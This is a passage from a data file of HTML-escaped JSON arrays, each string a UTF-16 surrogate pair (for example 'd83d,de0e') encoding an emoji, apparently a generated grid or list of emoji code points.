&quot;d83d,de0e&quot;, &quot;d83d,de09&quot;, &quot;d83d,de16&quot;, &quot;d83d,de07&quot;, &quot;d83d,de20&quot;, &quot;d83d,de16&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de29&quot;, &quot;d83d,de28&quot;, &quot;d83d,de10&quot;, &quot;d83d,de17&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de18&quot;, &quot;d83d,de26&quot;, &quot;d83d,de12&quot;, &quot;d83d,de08&quot;, &quot;d83d,de01&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de00&quot;, &quot;d83d,de17&quot;, &quot;d83d,de05&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de27&quot;, &quot;d83d,de25&quot;, &quot;d83d,de24&quot;, &quot;d83d,de28&quot; ], [ &quot;d83d,de08&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de28&quot;, &quot;d83d,de13&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de07&quot;, &quot;d83d,de18&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de19&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de19&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de25&quot;, &quot;d83d,de22&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de14&quot;, &quot;d83d,de08&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de00&quot;, &quot;d83d,de19&quot;, &quot;d83d,de10&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de07&quot;, &quot;d83d,de01&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de27&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de13&quot;, &quot;d83d,de02&quot;, &quot;d83d,de25&quot;, &quot;d83d,de18&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de02&quot;, &quot;d83d,de13&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de10&quot;, &quot;d83d,de24&quot;, &quot;d83d,de27&quot;, &quot;d83d,de04&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de05&quot; ], [ &quot;d83d,de0b&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de25&quot;, &quot;d83d,de10&quot;, &quot;d83d,de29&quot;, &quot;d83d,de20&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de06&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de13&quot;, &quot;d83d,de05&quot;, &quot;d83d,de13&quot;, &quot;d83d,de23&quot;, &quot;d83d,de23&quot;, &quot;d83d,de18&quot;, &quot;d83d,de10&quot;, &quot;d83d,de23&quot;, &quot;d83d,de23&quot;, &quot;d83d,de06&quot;, &quot;d83d,de23&quot;, &quot;d83d,de19&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de24&quot;, &quot;d83d,de06&quot;, &quot;d83d,de11&quot;, &quot;d83d,de01&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de01&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de17&quot;, &quot;d83d,de25&quot;, &quot;d83d,de24&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de20&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de12&quot;, &quot;d83d,de14&quot;, &quot;d83d,de09&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de29&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de16&quot;, &quot;d83d,de12&quot;, &quot;d83d,de26&quot; ], [ &quot;d83d,de16&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de29&quot;, &quot;d83d,de17&quot;, &quot;d83d,de20&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de07&quot;, &quot;d83d,de04&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de15&quot;, &quot;d83d,de02&quot;, &quot;d83d,de02&quot;, &quot;d83d,de29&quot;, &quot;d83d,de18&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de11&quot;, &quot;d83d,de24&quot;, &quot;d83d,de18&quot;, &quot;d83d,de03&quot;, &quot;d83d,de07&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de19&quot;, &quot;d83d,de18&quot;, &quot;d83d,de13&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de08&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de24&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de23&quot;, &quot;d83d,de21&quot;, &quot;d83d,de29&quot;, &quot;d83d,de21&quot;, &quot;d83d,de24&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de21&quot; ], [ &quot;d83d,de20&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de08&quot;, &quot;d83d,de11&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de23&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de05&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de13&quot;, &quot;d83d,de16&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de11&quot;, &quot;d83d,de19&quot;, &quot;d83d,de29&quot;, &quot;d83d,de20&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de05&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de00&quot;, &quot;d83d,de05&quot;, &quot;d83d,de17&quot;, &quot;d83d,de13&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de22&quot;, &quot;d83d,de16&quot;, &quot;d83d,de15&quot;, &quot;d83d,de06&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de21&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de04&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de23&quot;, &quot;d83d,de18&quot;, &quot;d83d,de19&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de08&quot;, &quot;d83d,de16&quot;, &quot;d83d,de11&quot;, &quot;d83d,de20&quot;, &quot;d83d,de11&quot;, &quot;d83d,de1b&quot; ], [ &quot;d83d,de24&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de13&quot;, &quot;d83d,de23&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de16&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de14&quot;, &quot;d83d,de14&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de19&quot;, &quot;d83d,de22&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de03&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de12&quot;, &quot;d83d,de23&quot;, &quot;d83d,de16&quot;, &quot;d83d,de10&quot;, &quot;d83d,de22&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de25&quot;, &quot;d83d,de24&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de28&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de15&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de02&quot;, &quot;d83d,de15&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de02&quot;, &quot;d83d,de06&quot;, &quot;d83d,de22&quot;, &quot;d83d,de23&quot;, &quot;d83d,de02&quot;, &quot;d83d,de15&quot;, &quot;d83d,de21&quot;, &quot;d83d,de13&quot;, &quot;d83d,de26&quot;, &quot;d83d,de00&quot;, &quot;d83d,de2c&quot; ], [ &quot;d83d,de27&quot;, &quot;d83d,de04&quot;, &quot;d83d,de13&quot;, &quot;d83d,de04&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de09&quot;, &quot;d83d,de11&quot;, &quot;d83d,de22&quot;, &quot;d83d,de13&quot;, &quot;d83d,de11&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de23&quot;, &quot;d83d,de19&quot;, &quot;d83d,de21&quot;, &quot;d83d,de27&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de18&quot;, &quot;d83d,de25&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de22&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de15&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de17&quot;, &quot;d83d,de16&quot;, &quot;d83d,de06&quot;, &quot;d83d,de00&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de21&quot;, &quot;d83d,de10&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de25&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de07&quot;, &quot;d83d,de18&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de02&quot;, &quot;d83d,de12&quot;, &quot;d83d,de18&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de21&quot; ], [ &quot;d83d,de12&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de08&quot;, &quot;d83d,de29&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de00&quot;, &quot;d83d,de12&quot;, &quot;d83d,de27&quot;, &quot;d83d,de21&quot;, &quot;d83d,de11&quot;, &quot;d83d,de17&quot;, &quot;d83d,de20&quot;, &quot;d83d,de27&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de01&quot;, &quot;d83d,de25&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de02&quot;, &quot;d83d,de16&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de24&quot;, &quot;d83d,de23&quot;, &quot;d83d,de13&quot;, &quot;d83d,de14&quot;, &quot;d83d,de27&quot;, &quot;d83d,de03&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de27&quot;, &quot;d83d,de03&quot;, &quot;d83d,de22&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de07&quot;, &quot;d83d,de09&quot;, &quot;d83d,de23&quot;, &quot;d83d,de01&quot;, &quot;d83d,de10&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de19&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de00&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de10&quot;, &quot;d83d,de0d&quot; ], [ &quot;d83d,de25&quot;, &quot;d83d,de15&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de00&quot;, &quot;d83d,de21&quot;, &quot;d83d,de03&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de26&quot;, &quot;d83d,de17&quot;, &quot;d83d,de14&quot;, &quot;d83d,de10&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de29&quot;, &quot;d83d,de24&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de12&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de10&quot;, &quot;d83d,de09&quot;, &quot;d83d,de23&quot;, &quot;d83d,de26&quot;, &quot;d83d,de13&quot;, &quot;d83d,de13&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de21&quot;, &quot;d83d,de25&quot;, &quot;d83d,de01&quot;, &quot;d83d,de24&quot;, &quot;d83d,de07&quot;, &quot;d83d,de27&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de24&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de24&quot;, &quot;d83d,de21&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de21&quot;, &quot;d83d,de26&quot;, &quot;d83d,de24&quot;, &quot;d83d,de23&quot;, &quot;d83d,de0f&quot; ], [ &quot;d83d,de27&quot;, &quot;d83d,de11&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de17&quot;, &quot;d83d,de14&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de20&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de26&quot;, &quot;d83d,de21&quot;, &quot;d83d,de06&quot;, &quot;d83d,de10&quot;, &quot;d83d,de17&quot;, &quot;d83d,de23&quot;, &quot;d83d,de23&quot;, &quot;d83d,de25&quot;, &quot;d83d,de10&quot;, &quot;d83d,de17&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de22&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de27&quot;, &quot;d83d,de08&quot;, &quot;d83d,de08&quot;, &quot;d83d,de03&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de16&quot;, &quot;d83d,de09&quot;, &quot;d83d,de18&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de13&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de08&quot;, &quot;d83d,de22&quot;, &quot;d83d,de02&quot;, &quot;d83d,de12&quot;, &quot;d83d,de11&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de10&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de12&quot;, &quot;d83d,de18&quot;, &quot;d83d,de28&quot;, &quot;d83d,de0b&quot; ], [ &quot;d83d,de00&quot;, &quot;d83d,de24&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de13&quot;, &quot;d83d,de12&quot;, &quot;d83d,de16&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de24&quot;, &quot;d83d,de25&quot;, &quot;d83d,de04&quot;, &quot;d83d,de05&quot;, &quot;d83d,de04&quot;, &quot;d83d,de11&quot;, &quot;d83d,de22&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de19&quot;, &quot;d83d,de21&quot;, &quot;d83d,de02&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de25&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de10&quot;, &quot;d83d,de22&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de12&quot;, &quot;d83d,de09&quot;, &quot;d83d,de05&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de03&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de18&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de07&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de20&quot;, &quot;d83d,de03&quot;, &quot;d83d,de17&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de05&quot;, &quot;d83d,de23&quot;, &quot;d83d,de14&quot;, &quot;d83d,de17&quot;, &quot;d83d,de01&quot;, &quot;d83d,de16&quot; ], [ &quot;d83d,de12&quot;, &quot;d83d,de16&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de21&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de20&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de28&quot;, &quot;d83d,de27&quot;, &quot;d83d,de15&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de22&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de02&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de25&quot;, &quot;d83d,de26&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de17&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de21&quot;, &quot;d83d,de17&quot;, &quot;d83d,de19&quot;, &quot;d83d,de16&quot;, &quot;d83d,de04&quot;, &quot;d83d,de29&quot;, &quot;d83d,de05&quot;, &quot;d83d,de00&quot;, &quot;d83d,de19&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de24&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de24&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de13&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de03&quot;, &quot;d83d,de28&quot;, &quot;d83d,de29&quot;, &quot;d83d,de08&quot; ], [ &quot;d83d,de19&quot;, &quot;d83d,de09&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de19&quot;, &quot;d83d,de28&quot;, &quot;d83d,de13&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de02&quot;, &quot;d83d,de23&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de05&quot;, &quot;d83d,de00&quot;, &quot;d83d,de10&quot;, &quot;d83d,de19&quot;, &quot;d83d,de26&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de26&quot;, &quot;d83d,de26&quot;, &quot;d83d,de06&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de06&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de02&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de03&quot;, &quot;d83d,de01&quot;, &quot;d83d,de04&quot;, &quot;d83d,de19&quot;, &quot;d83d,de21&quot;, &quot;d83d,de07&quot;, &quot;d83d,de06&quot;, &quot;d83d,de21&quot;, &quot;d83d,de15&quot;, &quot;d83d,de18&quot;, &quot;d83d,de15&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de18&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de20&quot;, &quot;d83d,de06&quot; ], [ &quot;d83d,de13&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de07&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de27&quot;, &quot;d83d,de17&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de17&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de08&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de00&quot;, &quot;d83d,de12&quot;, &quot;d83d,de15&quot;, &quot;d83d,de12&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de06&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de29&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de05&quot;, &quot;d83d,de20&quot;, &quot;d83d,de03&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de23&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de02&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de00&quot;, &quot;d83d,de19&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de10&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de12&quot;, &quot;d83d,de19&quot;, &quot;d83d,de18&quot;, &quot;d83d,de19&quot;, &quot;d83d,de08&quot;, &quot;d83d,de09&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de01&quot; ], [ &quot;d83d,de12&quot;, &quot;d83d,de00&quot;, &quot;d83d,de03&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de21&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de28&quot;, &quot;d83d,de12&quot;, &quot;d83d,de05&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de22&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de25&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de28&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de26&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de18&quot;, &quot;d83d,de16&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de01&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de09&quot;, &quot;d83d,de28&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de13&quot;, &quot;d83d,de17&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de07&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de06&quot;, &quot;d83d,de08&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de0f&quot; ], [ &quot;d83d,de1e&quot;, &quot;d83d,de15&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de01&quot;, &quot;d83d,de08&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de14&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de23&quot;, &quot;d83d,de13&quot;, &quot;d83d,de00&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de29&quot;, &quot;d83d,de15&quot;, &quot;d83d,de08&quot;, &quot;d83d,de25&quot;, &quot;d83d,de17&quot;, &quot;d83d,de26&quot;, &quot;d83d,de15&quot;, &quot;d83d,de22&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de00&quot;, &quot;d83d,de07&quot;, &quot;d83d,de05&quot;, &quot;d83d,de03&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de07&quot;, &quot;d83d,de10&quot;, &quot;d83d,de25&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de11&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de00&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de23&quot;, &quot;d83d,de01&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de21&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de07&quot;, &quot;d83d,de08&quot; ], [ &quot;d83d,de19&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de13&quot;, &quot;d83d,de12&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de15&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de08&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de04&quot;, &quot;d83d,de04&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de22&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de14&quot;, &quot;d83d,de17&quot;, &quot;d83d,de22&quot;, &quot;d83d,de25&quot;, &quot;d83d,de09&quot;, &quot;d83d,de18&quot;, &quot;d83d,de16&quot;, &quot;d83d,de26&quot;, &quot;d83d,de02&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de21&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de13&quot;, &quot;d83d,de14&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de15&quot;, &quot;d83d,de26&quot;, &quot;d83d,de17&quot;, &quot;d83d,de03&quot;, &quot;d83d,de01&quot;, &quot;d83d,de20&quot;, &quot;d83d,de06&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de1c&quot; ], [ &quot;d83d,de04&quot;, &quot;d83d,de23&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de12&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de08&quot;, &quot;d83d,de20&quot;, &quot;d83d,de11&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de07&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de02&quot;, &quot;d83d,de16&quot;, &quot;d83d,de10&quot;, &quot;d83d,de12&quot;, &quot;d83d,de05&quot;, &quot;d83d,de05&quot;, &quot;d83d,de14&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de02&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de18&quot;, &quot;d83d,de24&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de01&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de29&quot;, &quot;d83d,de06&quot;, &quot;d83d,de08&quot;, &quot;d83d,de26&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de16&quot;, &quot;d83d,de18&quot;, &quot;d83d,de05&quot;, &quot;d83d,de26&quot;, &quot;d83d,de28&quot;, &quot;d83d,de24&quot;, &quot;d83d,de04&quot; ], [ &quot;d83d,de0e&quot;, &quot;d83d,de22&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de01&quot;, &quot;d83d,de26&quot;, &quot;d83d,de05&quot;, &quot;d83d,de27&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de19&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de25&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de26&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de11&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de08&quot;, &quot;d83d,de22&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de01&quot;, &quot;d83d,de13&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de16&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de21&quot;, &quot;d83d,de21&quot;, &quot;d83d,de21&quot;, &quot;d83d,de25&quot;, &quot;d83d,de24&quot;, &quot;d83d,de27&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de13&quot;, &quot;d83d,de09&quot;, &quot;d83d,de14&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de25&quot;, &quot;d83d,de26&quot;, &quot;d83d,de11&quot;, &quot;d83d,de22&quot;, &quot;d83d,de2d&quot; ], [ &quot;d83d,de08&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de01&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de23&quot;, &quot;d83d,de27&quot;, &quot;d83d,de06&quot;, &quot;d83d,de08&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de29&quot;, &quot;d83d,de16&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de15&quot;, &quot;d83d,de08&quot;, &quot;d83d,de15&quot;, &quot;d83d,de00&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de28&quot;, &quot;d83d,de06&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de29&quot;, &quot;d83d,de04&quot;, &quot;d83d,de18&quot;, &quot;d83d,de14&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de24&quot;, &quot;d83d,de01&quot;, &quot;d83d,de05&quot;, &quot;d83d,de07&quot;, &quot;d83d,de06&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de04&quot;, &quot;d83d,de23&quot;, &quot;d83d,de12&quot;, &quot;d83d,de15&quot;, &quot;d83d,de27&quot;, &quot;d83d,de06&quot;, &quot;d83d,de10&quot;, &quot;d83d,de22&quot;, &quot;d83d,de21&quot;, &quot;d83d,de02&quot;, &quot;d83d,de11&quot;, &quot;d83d,de0b&quot; ], [ &quot;d83d,de15&quot;, &quot;d83d,de28&quot;, &quot;d83d,de12&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de25&quot;, &quot;d83d,de28&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de06&quot;, &quot;d83d,de28&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de26&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de03&quot;, &quot;d83d,de18&quot;, &quot;d83d,de17&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de29&quot;, &quot;d83d,de01&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de03&quot;, &quot;d83d,de17&quot;, &quot;d83d,de28&quot;, &quot;d83d,de19&quot;, &quot;d83d,de2d&quot;, 